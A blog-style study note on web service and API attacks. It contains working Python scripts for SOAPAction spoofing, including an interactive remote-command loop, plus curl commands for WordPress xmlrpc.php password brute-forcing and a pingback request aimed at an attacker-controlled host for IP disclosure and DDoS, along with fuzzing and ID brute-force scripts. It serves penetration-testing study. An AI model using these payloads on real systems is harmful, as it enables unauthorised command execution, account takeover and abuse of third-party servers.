---
title: Notes | Web Services and API Attacks
author: Zeropio
date: 2022-08-03
categories: [Notes, Web]
tags: [api, xxe, lfi, ssrf, xss, redos, sqli]
permalink: /notes/web/services-api
---

Web services provide a standard means of interoperating between different software applications, running on a variety of platforms and/or frameworks. Web services are characterized by their great interoperability and extensibility, as well as their machine-processable descriptions thanks to the use of XML. Web services enable applications to communicate with each other. The applications can be entirely different. 

An application programming interface (API) is a set of rules that enables data transmission between different software. The technical specification of each API dictates the data exchange.

The terms **web service** and **Application Programming Interface** (**API**) should not be used interchangeably in every case. First of all, web services are a type of API.

| **Web Service**   | **API**    |
|--------------- | --------------- |
| Need a network to achieve their objective | Can achieve their goal even offline |
| Rarely allow external developer access | Many welcome external developer tinkering |
| Usually utilize SOAP for security reasons | Can be found using different designs, such as XML-RPC, JSON-RPC, SOAP, and REST |
| Usually utilize the XML format for data encoding | Can be found using different formats to store data, with the most popular being JSON |

**WSDL** stands for **Web Service Description Language**. WSDL is an XML-based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention. A web service's WSDL file should not always be accessible. Developers may not want to publicly expose a web service's WSDL file, or they may expose it through an uncommon location, following a security through obscurity approach. 

Suppose we are assessing a SOAP service residing in the port **3002**. After fuzzing it we found the `/wsdl`{: .filepath} directory. The request to that page is blank, so maybe we need some parameter. We can fuzz the parameters until we find one valid, and we maybe find the WSDL file.

> WSDL files can be found as `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco`.
{: .prompt-info}

The WSDL file can contain:
- **Definition**: name of the web service, all namespaces used across the WSDL document and all other service elements are defined
- **Data Types**: the data types to be used in the exchanged messages
- **Messages**: defines input and output operations that the web service supports
- **Operation**: defines the available SOAP actions alongside the encoding of each message 
- **Port Type**: encapsulates every possible input and output message into an operation 
- **Binding**: binds the operation to a particular port type, bindings provide web service access details, such as the message format, operations, messages, and interfaces
- **Service**: a client makes a call to the web service through the name of the service specified in the service tag, to identifies the location of the web service

---

# Web Service Attacks 

## SOAPAction Spoofing

SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML. If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.

Suppose we are assessing a SOAP web service, whose WSDL file resides in `http://<TARGET>:3002/wsdl?wsdl`. The first thing to pay attention to is the following:
```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

We can see a SOAPAction operation called `ExecuteCommand`. Let us take a look at the parameters:
```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

We notice that there is a *cmd* parameter, let's make a Python script that runs a `whoami`:
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

> This function only works on internal networks.
{: .prompt-alert}

Let's build now the SOAPAction spoofing attack:
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

- We specify *LoginRequest* in `<soap:Body>`, so that our request goes through. **This operation is allowed from the outside**.
- We specify the parameters of *ExecuteCommand* because we want to have the SOAP service execute a `whoami` command.
- We specify the blocked operation (*ExecuteCommand*) in the SOAPAction header

If the web service determines the operation to be executed based solely on the SOAPAction header, we may bypass the restrictions and have the SOAP service execute a whoami command. If you want to be able to specify multiple commands and see the result each time, use the following Python script:
```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

## Attacking WordPress xmlrpc.php

It is important to note that `xmlrpc.php`{: .filepath} being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, `xmlrpc.php`{: .filepath} can facilitate some enumeration and exploitation activities, though.

Suppose we are assessing the security of a WordPress instance. Through enumeration activities, we identified a valid username, *admin*, and that xmlrpc.php is enabled. Identifying if xmlrpc.php is enabled is as easy as requesting xmlrpc.php on the domain we are assessing. We can mount a password brute-forcing attack through xmlrpc.php:
```console
zero@pio$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://<TARGET>/xmlrpc.php
```

To identified the correct method (*system.listMethods*) you can check the [WordPress Code](https://codex.wordpress.org/XML-RPC/system.listMethods) and interacting with xmlrpc.php as:
```console
zero@pio$  curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://<TARGET>/xmlrpc.php

...
```

Inside the list of available methods above, check for one vulnerable, for example [pingback.ping](https://codex.wordpress.org/XML-RPC_Pingback_API). Unfortunately, if pingbacks are available, they can facilitate:
- **IP Disclosure**: identify its public IP, the pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance
- **Cross-Site Port Attack** (**XSPA**): open ports or internal hosts can be identified by looking for response time differences or response differences
- **Distributed Denial of Service Attack** (**DDoS**): an attacker can call the pingback.ping method on numerous WordPress instances against a single target 

Find below how an IP Disclosure attack could be mounted if xmlrpc.php is enabled and the pingback.ping method is available. XSPA and DDoS attacks can be mounted similarly:
```html
--> POST /xmlrpc.php HTTP/1.1 
Host: <TARGET> 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://<TARGET>/<PATH>/</string></value>
</param>
</params>
</methodCall>
```

---

# API Attacks 

## Information Disclosure 

As already discussed, security-related inefficiencies or misconfigurations in a web service or API can result in information disclosure. When assessing a web service or API for information disclosure, we should spend considerable time on fuzzing.

### through Fuzzing 

Using the previous examples, start by fuzzing a [parameter list](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt):
```console
zero@pio$ ffuf -w <WORDLIST> -u 'http://<TARGET>:3002/?FUZZ=test' -fs <NUMBER>
```

Take for example we got the *id* parameter with the following request:
```console
zero@pio$ curl http://<TARGET>:3003/?id=1

[{"id":"1","username":"admin","position":"1"}]
```

We can use the following Python script:
```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET>:3003/")

brute()
```

Also, there can be other vulnerabilities in parameters like *id*, for example SQLi.

